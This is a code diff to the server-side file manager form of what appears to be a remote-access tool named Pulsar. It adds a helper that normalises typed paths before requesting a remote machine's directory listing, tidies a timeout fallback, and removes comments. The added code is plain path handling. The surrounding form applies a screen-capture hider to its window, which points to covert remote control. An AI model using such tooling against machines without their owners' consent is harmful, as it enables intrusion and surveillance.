@@ -83,6 +83,43 @@ namespace Pulsar.Server.Forms
             DarkModeManager.ApplyDarkMode(this);
 			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
+        private string NormalizeUserTypedPath(string input)
+        {
+            if (string.IsNullOrWhiteSpace(input))
+                return input;
+
+            string path = input.Trim();
+
+            // Expand %ENVVAR%
+            path = Environment.ExpandEnvironmentVariables(path);
+
+            // Expand ~ to user profile
+            if (path.StartsWith("~"))
+            {
+                string profile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                path = Path.Combine(profile, path.Substring(1).TrimStart('\\', '/'));
+            }
+
+            // Fix forward slashes
+            path = path.Replace('/', '\\');
+
+            // Handle drive-letter without slash:  C:  →  C:\
+            if (path.Length == 2 && char.IsLetter(path[0]) && path[1] == ':')
+                path += "\\";
+
+            // Ensure full absolute path
+            try
+            {
+                path = Path.GetFullPath(path);
+            }
+            catch
+            {
+                // Invalid paths get returned raw, client handles errors already
+            }
+
+            return path;
+        }
+
         private void TxtPath_KeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyCode != Keys.Enter)
@@ -91,35 +128,23 @@ namespace Pulsar.Server.Forms
             e.Handled = true;
             e.SuppressKeyPress = true;
 
-            string newPath = txtPath.Text.Trim();
+            string newPath = NormalizeUserTypedPath(txtPath.Text);
+
             if (string.IsNullOrWhiteSpace(newPath))
                 return;
-
-            // Request directory contents from remote machine.
-            // The client will tell us if the path exists or not.
-            // If the path doesn't exist, DirectoryChanged will NOT fire.
-            // So we add a small fallback check.
 
             _fileManagerHandler.GetDirectoryContents(newPath);
             SetStatusMessage(this, $"Opening {newPath} ...");
 
-            // Fail-safe timeout check
             var timer = new System.Windows.Forms.Timer();
-            timer.Interval = 500; // half second
+            timer.Interval = 500;
             timer.Tick += (s, ev) =>
             {
                 timer.Stop();
 
-                // If the directory didn't update to this new path, it failed
                 if (_currentDir != newPath)
                 {
-                    //MessageBox.Show("The path does not exist on the remote machine.",
-                    //    "Invalid Path",
-                    //    MessageBoxButtons.OK,
-                    //    MessageBoxIcon.Error);
-
-                    // Reset box to current dir
-                    txtPath.Text = _currentDir;
+                    txtPath.Text = _currentDir; // revert
                 }
             };
             timer.Start();
